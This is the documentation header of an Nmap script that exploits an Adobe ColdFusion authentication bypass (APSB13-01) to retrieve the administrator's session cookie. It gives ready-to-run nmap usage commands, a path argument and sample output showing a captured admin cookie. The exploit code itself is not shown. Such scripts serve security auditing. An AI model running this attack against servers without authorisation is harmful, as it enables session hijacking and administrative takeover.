description = [[
Attempts to exploit an authentication bypass vulnerability (apsb13-01) to retrieve the administrator's session cookie of Adobe Coldfusion servers.
]]

---
-- @usage nmap -sV --script http-adobe-coldfusion-apsb1301 <target>
-- @usage nmap -p80 --script http-adobe-coldfusion-apsb1301 --script-args basepath=/cf/adminapi/ <target>
-- 
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-adobe-coldfusion-apsb1301: 
-- |_  admin_cookie: aW50ZXJhY3RpdmUNQUEyNTFGRDU2NzM1OEYxNkI3REUzRjNCMjJERTgxOTNBNzUxN0NEMA1jZmFkbWlu
--
-- @args http-adobe-coldfusion-apsb1301.basepath URI path to administrator.cfc. Default: /CFIDE/adminapi/
--
---
